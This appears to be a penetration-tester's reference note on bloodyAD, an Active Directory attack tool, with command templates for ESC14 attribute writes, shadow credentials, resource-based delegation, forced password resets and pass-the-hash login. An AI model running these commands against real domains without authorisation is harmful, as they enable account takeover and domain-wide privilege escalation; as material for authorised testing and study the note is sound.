# bloodyAD

**Tags:** #AD #LDAP #ActiveDirectory #privesc #enumeration

An Active Directory privilege-escalation framework that talks LDAP/LDAPS/SAMR directly, with no reliance on `.NET` or a Windows host. Where most Linux AD tooling only *reads* the directory, bloodyAD's value is that it **writes** it — `set object` will put an arbitrary value into an arbitrary attribute, which is exactly what several attack paths need and what the specialised tools refuse to do.

That gap matters for **ESC14**: [[Tools/AD/Certipy|Certipy]]'s `account` subcommand can only write `-dns`, `-upn`, `-sam`, `-spns`, `-pass` and `-group`, so it cannot touch `altSecurityIdentities` at all. bloodyAD can. It also covers the usual RBCD / shadow-credential / DACL writes, and supports Kerberos, NTLM hashes and certificate auth.

**Source:** https://github.com/CravateRouge/bloodyAD
**Install:** `pipx install bloodyAD` (or `apt install bloodyad` on recent Kali)

```bash
# Generic attribute write — the ESC14 primitive
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> altSecurityIdentities \
  -v 'X509:<I>DC=com,DC=domain,CN=CORP-CA<SR>1200000012ab'

# Read it back to confirm
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  get object <target_user> --attr altSecurityIdentities

# Other writes that show up alongside AD CS work
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' add shadowCredentials <target>
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' add rbcd <target> <controlled_machine$>
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' set password <target> 'NewPass123!'

# Auth variants
bloodyAD --host <dc_ip> -d <domain> -u <user> -p ':<NTLM_hash>' get children
bloodyAD --host <dc_ip> -d <domain> -k get children                    # Kerberos, from KRB5CCNAME
```

> [!warning] `set object` overwrites the attribute's value. On a multi-valued attribute such as `altSecurityIdentities`, read the existing values first and re-supply them alongside yours, or you will silently break a legitimate certificate mapping that someone depends on.

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Active Directory/ADCS|ADCS]] — writing `altSecurityIdentities` for ESC14, the one step Certipy cannot perform; [[Services/Active Directory/Kerberos|Kerberos]] — the `sAMAccountName` rename primitive in the manual noPac (CVE-2021-42278/42287) chain, plus RBCD writes.
> Also [[Services/Network management/LDAP|LDAP]] — bloodyAD's read/write primitives (RBCD, shadow creds, DACL, `add computer`) are the write side of the LDAP attack surface.
> Related tooling: [[Tools/AD/Certipy|Certipy]] (the AD CS side of the same attack), [[Tools/AD/PowerView|PowerView]] (`Set-DomainObject`, the Windows-side equivalent), [[Tools/AD/ldapsearch|ldapsearch]] (read-only triage of what's already set).

---

*Created: 2026-09-22*
*Updated: 2026-09-23*
*Model: claude-opus-5*
